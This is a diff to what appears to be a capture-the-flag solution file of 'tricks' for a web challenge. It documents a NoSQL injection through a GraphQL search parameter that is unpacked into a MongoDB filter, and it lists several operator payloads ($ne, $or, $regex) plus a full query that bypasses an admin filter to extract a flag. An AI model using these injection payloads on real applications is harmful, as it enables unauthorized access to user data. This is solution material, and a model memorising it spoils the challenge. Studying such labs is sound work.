@@ -21,7 +21,7 @@ tricks:
       #         query = query.filter(**search_criteria)
       #     except json.JSONDecodeError:
       #         pass
-      # 
+      #
       # Vulnerability:
       # - search parameter is JSON parsed without validation
       # - Result is unpacked with **search_criteria into filter()
@@ -34,7 +34,7 @@ tricks:
     payload: |
       # scripts.js line 43:
       # Default query filters: {"email": {"$regex": ".*@heytheregotrythis.com"}, "is_admin": false}
-      # 
+      #
       # This excludes admin users from the default view
       # Admin users exist:
       # - admin@heytheregotrythis.com (is_admin=True, no flag)
@@ -46,9 +46,9 @@ tricks:
     payload: |
       # Basic payload to get all admin users:
       {"is_admin": true}
-      # 
+      #
       # This bypasses the default filter and returns admin users
-      # 
+      #
       # Alternative payloads:
       {"is_admin": {"$ne": false}}  # Not equal to false
       {"$or": [{"is_admin": true}]}  # OR condition
@@ -63,7 +63,7 @@ tricks:
       {
         "query": "query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 10}\") { username email flag } }"
       }
-      # 
+      #
       # The application:
       # 1. Receives GraphQL query
       # 2. Extracts search parameter: "{\"is_admin\": true}"
@@ -90,12 +90,12 @@ tricks:
       #     }
       #   ]
       # }
-      # 
+      #
       # Flag extraction:
       # for user in response["users"]:
       #     if user.get("flag"):
       #         flag = user["flag"]
-      # 
+      #
       # Note: admin2 user has the flag
 
   - name: "Alternative: Query by domain"
@@ -104,7 +104,7 @@ tricks:
     payload: |
       # Query admin2 specifically:
       {"email": {"$regex": ".*@goodyoutriedsomethingelse.com"}}
-      # 
+      #
       # Or combine conditions:
       {"$and": [{"is_admin": true}, {"email": {"$regex": ".*goodyoutriedsomethingelse.*"}}]}
 
@@ -114,15 +114,14 @@ tricks:
     payload: |
       # Use $ne (not equal):
       {"is_admin": {"$ne": false}}
-      # 
+      #
       # Use $or:
       {"$or": [{"is_admin": true}]}
-      # 
+      #
       # Use $and:
       {"$and": [{"is_admin": true}]}
-      # 
+      #
       # Use regex on email:
       {"email": {"$regex": ".*admin.*"}}
-      # 
+      #
       # Note: **kwargs unpacking allows any MongoDB operator
-
